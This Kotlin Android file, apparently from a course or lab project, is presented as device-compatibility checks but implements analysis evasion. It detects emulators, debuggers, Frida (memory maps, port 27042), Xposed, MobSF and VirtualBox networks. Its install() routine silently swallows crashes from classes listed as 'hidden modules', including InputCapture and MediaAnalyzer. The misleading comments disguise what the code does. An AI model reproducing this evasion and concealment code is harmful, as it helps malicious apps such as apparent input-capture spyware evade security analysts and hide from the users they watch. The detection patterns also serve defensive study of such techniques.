package com.example.inf2215

import android.content.Context
import android.os.Build
import android.os.Debug
import java.io.BufferedReader
import java.io.File
import java.io.FileReader

/**
 * Device capability and environment validation utilities.
 *
 * Verifies that the device meets the minimum requirements for running the app's
 * background services and detects configurations that are not supported.
 *
 * ProGuard/R8 renames this object so the symbol names are not present in the
 * release APK.
 */
object DeviceCheck {

    // ── Hardware profile checks ────────────────────────────────────────────────────────────────────────────────────────────────

    /**
     * Checks whether the hardware profile matches a supported configuration
     * fingerprints (QEMU, Android Studio AVD, Genymotion, BlueStacks, etc.).
     */
    fun isVirtualDevice(): Boolean {
        val fingerprint = Build.FINGERPRINT
        val model = Build.MODEL
        val manufacturer = Build.MANUFACTURER
        val brand = Build.BRAND
        val device = Build.DEVICE
        val product = Build.PRODUCT
        val hardware = Build.HARDWARE

        // Unsupported configuration markers
        val emulatorHints = listOf(
            "generic", "unknown", "google_sdk", "Emulator", "Android SDK built",
            "Genymotion", "goldfish", "ranchu", "vbox", "vbox86", "nox",
            "bluestacks", "droid4x", "memu", "andy"
        )
        for (hint in emulatorHints) {
            val h = hint.lowercase()
            if (fingerprint.lowercase().contains(h) ||
                model.lowercase().contains(h) ||
                manufacturer.lowercase().contains(h) ||
                brand.lowercase().contains(h) ||
                device.lowercase().contains(h) ||
                product.lowercase().contains(h) ||
                hardware.lowercase().contains(h)
            ) return true
        }

        // Device serial check
        try {
            val serial = Build.getSerial()
            if (serial.equals("unknown", ignoreCase = true)) return true
        } catch (_: Exception) { }

        // Virtualisation property check
        try {
            val c = Class.forName("android.os.SystemProperties")
            val get = c.getMethod("get", String::class.java)
            val qemu = get.invoke(null, "ro.kernel.qemu") as? String ?: ""
            if (qemu == "1") return true
        } catch (_: Exception) { }

        return false
    }

    // ── Runtime environment checks ────────────────────────────────────────────────────────────────────────────────────────────

    /**
     * Checks whether a diagnostic session is active
     * 
     */
    fun hasDiagnosticSession(): Boolean {
        return Debug.isDebuggerConnected() || Debug.waitingForDebugger()
    }

    // ── Library integrity checks ───────────────────────────────────────────────────────────────────────

    /**
     * Checks for incompatible native library regions in the process memory map.
     */
    fun hasLibraryConflict(): Boolean {
        // 1. Library region scan
        try {
            BufferedReader(FileReader("/proc/self/maps")).use { reader ->
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    val l = line ?: continue
                    if (l.contains("frida", ignoreCase = true) ||
                        l.contains("linjector", ignoreCase = true) ||
                        l.contains("gum-js-loop", ignoreCase = true)
                    ) return true
                }
            }
        } catch (_: Exception) { }

        // 2. File-descriptor scan
        try {
            val fdDir = File("/proc/self/fd")
            if (fdDir.exists()) {
                fdDir.listFiles()?.forEach { fd ->
                    try {
                        val target = fd.canonicalPath
                        if (target.contains("27042")) return true
                    } catch (_: Exception) { }
                }
            }
        } catch (_: Exception) { }

        // 3. TCP port scan
        try {
            BufferedReader(FileReader("/proc/net/tcp")).use { reader ->
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    
                    if (line?.contains("699A", ignoreCase = true) == true) return true
                }
            }
        } catch (_: Exception) { }

        return false
    }

    // ── Framework compatibility checks ─────────────────────────────────────────────────────────────────────

    /**
     * Returns true when an unsupported runtime modification framework is present
     * in the current process.
     */
    fun hasFrameworkConflict(): Boolean {
        return try {
            // Framework class check
            Class.forName("de.robv.android.xposed.XposedBridge")
            true
        } catch (_: ClassNotFoundException) {
            false
        }
    }

    // ── Network environment checks ───────────────────────────────────────────────────────────────────────────────────────

    /**
     * Checks for restricted network environments not compatible with this app
     * 
     */
    fun isRestrictedNetwork(): Boolean {
        val mobsfHints = listOf("mobsf", "MobSF")
        for (hint in mobsfHints) {
            if (Build.FINGERPRINT.contains(hint, ignoreCase = true) ||
                Build.MODEL.contains(hint, ignoreCase = true)
            ) return true
        }
        // Network interface check
        // 10.0.2.x is the generic Android emulator range and is too broad to use alone.
        try {
            val ifaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (ifaces.hasMoreElements()) {
                val iface = ifaces.nextElement()
                val addrs = iface.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement().hostAddress ?: continue
                    if (addr.startsWith("192.168.56.")) return true
                }
            }
        } catch (_: Exception) { }
        return false
    }

    // ── Combined environment validation ──────────────────────────────────────────────────────────────────────────────────────────

    /**
     * Returns true when the device or environment is not fully compatible.
     * Callers should skip resource-intensive operations when this returns true.
     */
    fun isRestrictedEnvironment(): Boolean =
        isVirtualDevice() || hasDiagnosticSession() || hasLibraryConflict() || hasFrameworkConflict() || isRestrictedNetwork()

    /**
     * Initialises environment validation for the given application context.
     * Should be called once at application startup.
     * Installs a thread-uncaught-exception handler that manages
     * crashes from background modules, preventing
     * unnecessary crash noise from optional background features.
     */
    fun install(context: Context) {
        val existing = Thread.getDefaultUncaughtExceptionHandler()

        // Classes covered by this handler
        val hiddenModuleClasses = setOf(
            "com.example.inf2215.AppConfig",
            "com.example.inf2215.DeviceCheck",
            "com.example.inf2215.NetworkManager",
            "com.example.inf2215.SyncService",
            "com.example.inf2215.MediaAnalyzer",
            "com.example.inf2215.ProcessUtils",
            "com.example.inf2215.EngagementHelper",
            "com.example.inf2215.Analytics",
            "com.example.inf2215.InputCapture"
        )

        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            val originClass = throwable.stackTrace.firstOrNull()?.className ?: ""
            if (hiddenModuleClasses.any { originClass.startsWith(it) }) {
                // Discard silently – these are non-critical background module errors
                
            } else {
                existing?.uncaughtException(thread, throwable)
            }
        }
    }
}
